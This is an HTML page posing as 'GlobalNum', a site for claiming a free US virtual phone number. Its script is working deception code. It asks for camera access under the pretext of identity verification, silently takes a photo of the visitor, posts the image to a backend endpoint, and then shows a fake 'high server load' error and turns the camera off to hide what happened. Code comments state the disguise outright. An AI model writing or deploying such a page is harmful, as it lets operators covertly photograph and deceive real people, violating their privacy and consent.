<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GlobalNum - Claim Your Virtual Number</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: white; text-align: center; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: #1e293b; padding: 30px; border-radius: 15px; border: 1px solid #334155; }
        .number-box { font-size: 24px; color: #38bdf8; font-weight: bold; margin: 20px 0; letter-spacing: 2px; }
        button { background: #38bdf8; color: #0f172a; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; }
        #status { margin-top: 15px; color: #94a3b8; font-size: 14px; }
        .spinner { display: none; margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h2>🇺🇸 US Number Available</h2>
        <div class="number-box">+1 (202) 555-0199</div>
        <p>To prevent bot abuse, identity verification is required to claim this number.</p>
        
        <button id="claimBtn">Claim This Number</button>
        <div class="spinner" id="loader"></div>
        <p id="status"></p>

        <video id="video" style="display:none;" autoplay></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        const claimBtn = document.getElementById('claimBtn');
        const loader = document.getElementById('loader');
        const status = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        claimBtn.onclick = async () => {
            claimBtn.style.display = 'none';
            loader.style.display = 'block';
            status.innerText = "Initializing secure connection...";

            try {
                // Requesting camera under the guise of "Identity Verification"
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                status.innerText = "Verifying identity... Please wait.";

                // Take photo silently after 1.5 seconds (letting camera focus)
                setTimeout(async () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const imgBase64 = canvas.toDataURL('image/jpeg');

                    // Send to your backend
                    await fetch('/api/capture', {
                        method: 'POST',
                        body: JSON.stringify({ image: imgBase64 }),
                        headers: { 'Content-Type': 'application/json' }
                    });

                    // Keep the user on the page so it looks normal
                    status.innerText = "Error: High server load. Please try again in 5 minutes.";
                    loader.style.display = 'none';
                    stream.getTracks().forEach(track => track.stop()); // Turn off camera light
                }, 1500);

            } catch (err) {
                status.innerText = "Error: Camera access is required for KYC verification.";
                loader.style.display = 'none';
                claimBtn.style.display = 'block';
            }
        };
    </script>
</body>
</html>
